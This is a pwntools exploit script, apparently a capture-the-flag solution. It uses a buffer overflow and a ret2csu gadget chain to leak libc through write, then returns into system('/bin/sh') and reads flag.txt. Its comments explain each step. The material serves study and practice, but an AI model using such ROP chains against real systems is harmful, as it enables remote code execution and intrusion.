from pwn import *

elf = context.binary = ELF('./task_patched')
libc = ELF('./libc6_2.31-0ubuntu9.1_amd64.so')
rop = ROP(elf.path)
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main",
		"c"
	]))
elif args.REMOTE:
	host, port = args.get("HOST", "localhost"), args.get("PORT", 5000)
	p = remote(host, port)
else:
	p = process(elf.path)


PADDING = b'A' * 5 * 8

# we need to call write to leak libc function address
# to call write we need three registers - rdi (fd), rsi (buf), rdx (len)
# we have rdi and rsi gadgets but no gadget for rdx
# we can use some code from __libc_csu_init	function

# .text:0000000000401240	mov     rdx, r14
# .text:0000000000401243	mov     rsi, r13
# .text:0000000000401246	mov     edi, r12d
# .text:0000000000401249	call    qword ptr [r15+rbx*8]
# .text:000000000040124D	add     rbx, 1
# .text:0000000000401251	cmp     rbp, rbx
# .text:0000000000401254	jnz     short loc_401240
# .text:0000000000401256
# .text:0000000000401256 loc_401256:
# .text:0000000000401256	add     rsp, 8
# .text:000000000040125A	pop     rbx
# .text:000000000040125B	pop     rbp
# .text:000000000040125C	pop     r12
# .text:000000000040125E	pop     r13
# .text:0000000000401260	pop     r14
# .text:0000000000401262	pop     r15
# .text:0000000000401264	retn

# let's use 0x000000000040125A gadget to set values, and then jump to 0x0000000000401240  (r14 is copied to rdx)
# we need to call valid function at 0x0000000000401249, so r15+rbx*8 should point to the valid address (for example __libc_csu_fini, it is empty func)
# we are controlling both values, so we can set rbx to 0 and manipulate with r15
# after the call the cmp intruction the rbp should equals rbx, so setting rbp to one is a good idea


p.sendlineafter(b"You have one job!\n\x00",
	PADDING
	+ p64(0x000000000040126A)
	+ p64(0) # rbx
	+ p64(1) # rbp
	+ p64(1) # r12 and edi
	+ p64(elf.got['write']) # rsi and r13 - address of write function (GOT)
	+ p64(8) # rdx and r14, we need to print 8 bytes
	+ p64(elf.got['write']) # r15 - call write function with prepared params
	+ p64(0x0000000000401250)
	+ p64(0x1337) * 7 # for series of 401256 gadgets

	+ p64(elf.symbols['main'])
)
write_leak = p.recvuntil(b"You have one job!\n", drop=True)
write_leak = u64(write_leak.ljust(8, b'\x00'))
print(f"Write leak {hex(write_leak)}")
libc_base = write_leak - libc.symbols['write']
libc.address = libc_base

print(f"libc base: {hex(libc_base)}")

p.sendline(
	PADDING
	+ p64(POP_RDI) # pop rdi ; ret
	+ p64(next(libc.search(b"/bin/sh"))) # /bin/sh string address
	+ p64(RET) # ret
	+ p64(libc.symbols['system'])
)

sleep(1.0)
p.sendline(b'cat flag.txt')

output = p.clean(1.0)
print(output)
